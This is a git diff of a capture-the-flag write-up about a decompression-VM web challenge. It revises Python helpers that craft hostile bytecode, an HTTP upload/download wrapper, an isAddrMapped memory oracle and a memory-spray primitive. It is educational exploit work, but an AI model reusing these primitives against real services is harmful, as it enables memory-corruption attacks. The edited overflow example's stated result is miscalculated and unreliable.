@@ -224,7 +224,7 @@ It's mostly glue code to get an oatpp web server up and running, in fact the imp
 * src/controller/MyController.*
 * kylezip/decompress.*
 
-## 3.1 MyController
+## 3.1 MyController.*
 
 <p align="center"> <img src="./images/MyControllerHpp.png"><br/> <i>MyController.hpp</i><p/> 
 
@@ -306,9 +306,9 @@ which:
   ``` 
   if we can control `sb.st_size`, which is the size of the decompressed file, we could easily turn it into a memory spraying primitive.
 
-## 3.1 decompress
+## 3.2 decompress.*
 
-This is what gets compiled into `libkayle.so`, here it is an overview of what it does.
+### decompress()
 
 ```C
 int decompress(const char *fname)
@@ -318,10 +318,23 @@ int decompress(const char *fname)
 * Map the output file to the address `0x13371337000`.
 * Calls do_decompress() which gets the decompression done.
 
+The file is expected to be in the format:
+| offset | name | type | description |
+| - | - | - | - | 
+| +0h | magic | uint64 | a magic value, it is expected to be 0x0123456789abcdef |
+| +8h | filesize | uint64 | size of the decompressed file |
+
+### do_decompress()
+
+
 ```C
 static void do_decompress(char *out, char *in, size_t insize)
 ```
-You can view this function as a simple *virtual machine*, which executes the bytecode `in` and writes the output to `out`.
+You can view this function as a simple *virtual machine*, which executes the bytecode pointed by `in` and writes the output to the buffer pointed by `out`. 
+
+`in` points to our `{file_id}`.
+
+`out` points to `{file_id.unkyle}`.
 
 This VM has 4 opcodes:
 * 0 -> NOP
@@ -343,15 +356,15 @@ This VM has 4 opcodes:
 
   set `out` to `out + off`. 
   
-  `out` and `off` are 64 bit values, so `out = out+off` is equivalent to `out = (out+off) % MAX_64BIT_VALUE`, this is called [integer overflow](https://en.wikipedia.org/wiki/Integer_overflow) and we can exploit this behaviour to always reach any 64 bit value. Example:
+  `out` and `off` are 64 bit values, so `out = out+off` is equivalent to `out = (out+off) % MAX_64BIT_VALUE`, this is called [integer overflow](https://en.wikipedia.org/wiki/Integer_overflow) and we can exploit this behaviour to reach any 64 bit value. Example:
   ```py
-  M64 = 0xFFFFFFFF_FFFFFFFF # maximum 64 bit value
+  M64 = (1<<64) # Maximum 64bit value
   def get_off(out: int, target: int):
-    return (target - out) % M64
-  
+    return (target-out)
+
   # We are at 0xffffffff, what can we add to reach 0?
   print ('{:#x}'.format(get_off(0xffffffff, 0)))
-  # Try it yourself :)
+  # Result = 0xffffffff00000000
   ```
 
   Opcode implementation:
@@ -403,34 +416,35 @@ class CompressedFile():
         self.out = OUT_ADDR
 
     def nop(self):
-        self.content += b'\x00' # cmd0
+        self.content += b'\x00'
         self.cur += 1
 
     def write(self, b: bytes):
         assert len(b) == 1
 
-        self.content += b'\x01' + b # cmd1 + byte
+        self.content += b'\x01' + b
         self.cur += 2
         self.out += 1 & M64
 
     def seek(self, off):
-        self.content += b'\x02' # cmd2
-        self.content += p64(off) # offset
+        self.content += b'\x02'
+        self.content += p64(off)
         self.cur += 9
         self.out += off & M64
 
     def memcpy(self, off, count):
         # memcpy(out, out-off, count);
-        self.content += b'\x03' # cmd33
-        self.content += p64(off) # offset
-        self.content += p64(count) # offset
+        self.content += b'\x03'
+        self.content += p64(off)
+        self.content += p64(count)
         self.cur += 17
         self.out += count & M64
 ```
 
-## 4 Poking the challenge
+# 4. Interacting with the binary
 
-You can interact with the challenge using python requests, here is my code:
+Before diving into the exploitation phase, It is always good to build something that let you easily interact with the binary, to avoid wasting time.
+
 ```py
 import requests
 
@@ -453,13 +467,16 @@ def getFile(fileid: int, extract="true"):
     return res
 ```
 
-## 4.1 Inspect the memory mappings of the challenge
+### Inspect the memory mappings of the challenge
+
+That was very important to me when trying to solve the challenge, I starred at the memory mappings for a lot of time.
 
 To do this, you can spawn a local instance of the challenge and read the process maps after doing some operations.
 
-<p align="center"> <img src="./images/read-proc-mappings.png" ><br/> <i>Initial state</i><p/> 
+<p align="center"> <img src="./images/read-proc-mappings.png" ><br/> <i></i><p/> 
 
-## 4.2 The isAddressMapped oracle
+
+## 4.2 isAddrMapped oracle
 
 We are given a read what where primitive, so building an isAddressMapped oracle is not hard at all.
 
@@ -467,7 +484,10 @@ My way to do it was to build this bytecode:
 * `memcpy(out, targetAddress, 1)`
 * `write(b'A')`
 
-If targetAddress is not mapped, then memcpy segfaultes, so `write(b'A')` doesn't get called
+If targetAddress is not mapped the child program segfaults on memcpy, giving us a decompressed file filled with null bytes.
+
+If targetAddress is mapped, the decompressed file has a b'\x41' as the second byte.
+
 ```py
 def isAddrMapped(addr, fileid, filelen=2):
     toup = CompressedFile(filelen)
@@ -477,7 +497,7 @@ def isAddrMapped(addr, fileid, filelen=2):
     # memcpy(toup.out, addr, 1)
     toup.memcpy(off, 1)
     # *(toup.out+1) = 0x41
-    toup.write(b'A')
+    toup.write(b'\x41')
 
     uploadFile(toup.content, fileid)
     res = getFile(fileid)
@@ -486,8 +506,17 @@ def isAddrMapped(addr, fileid, filelen=2):
     return isMapped
 ```
 
-## 4.3 The memory spray primitive
+## 4.3 Memory Spray primitive
 
 We can completely control the size of the decompressed file, and we get an mmap of that size in [MyController.cpp:62](resources/dist-guess-god/src/src/controller/MyController.cpp#L62). 
 
-After some trial and error it turns out that we can allocate 
+In my exploit i used the `isAddrMapped` function, and changed the filelen.
+
+For example, to allocate a contiguous memory chunk of a given size, you can do:
+```py
+isAddrMapped(IN_ADDR, i, size)
+```
+
+## 4.4 How much memory to spray?
+
+The ideal case is to reproduce my PoC
